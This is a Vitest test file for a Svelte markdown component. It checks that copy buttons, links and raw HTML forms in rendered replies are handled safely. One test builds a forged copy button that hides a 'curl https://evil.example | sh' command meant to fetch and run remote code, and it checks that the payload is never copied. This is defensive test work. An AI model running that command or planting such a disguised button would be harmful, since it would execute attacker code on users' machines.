import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import '@testing-library/jest-dom/vitest';
import { render, cleanup, fireEvent } from '@testing-library/svelte';

// The default export is a factory in this environment; build a real
// sanitizer on jsdom's window rather than stubbing it out.
vi.mock('dompurify', async () => {
  const actual = await vi.importActual<{ default: (w: Window) => unknown }>('dompurify');
  return { default: actual.default(window) };
});

import MarkdownBlock from './MarkdownBlock.svelte';

const writeText = vi.fn(async () => {});

beforeEach(() => {
  writeText.mockClear();
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
});

afterEach(() => cleanup());

describe('MarkdownBlock copy buttons', () => {
  it('copies the code the block shows', async () => {
    const { container } = render(MarkdownBlock, { content: '```\nnpm install\n```' });
    await fireEvent.click(container.querySelector('button.code-copy-btn')!);
    expect(writeText).toHaveBeenCalledWith('npm install');
  });

  it('ignores a copy button written as raw HTML in the reply', async () => {
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="code-block-wrapper"><pre><code>npm install</code></pre>`
      + `<button class="code-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    const { container } = render(MarkdownBlock, { content: `Run this:\n\n${forged}` });

    const button = container.querySelector('button.code-copy-btn');
    expect(button).not.toBeNull();
    await fireEvent.click(button!);
    expect(writeText).not.toHaveBeenCalled();
  });
});

describe('MarkdownBlock links', () => {
  it('does not follow links that would navigate the app window', async () => {
    const { container } = render(MarkdownBlock, { content: '[same page](?reload) and [relative](index.html)' });
    for (const a of container.querySelectorAll('a')) {
      const click = new MouseEvent('click', { bubbles: true, cancelable: true });
      a.dispatchEvent(click);
      expect(click.defaultPrevented).toBe(true);
    }
  });

  it('drops forms from raw HTML', () => {
    const { container } = render(MarkdownBlock, { content: '<form action="?x"><button>Go</button></form>' });
    expect(container.querySelector('form')).toBeNull();
  });
});
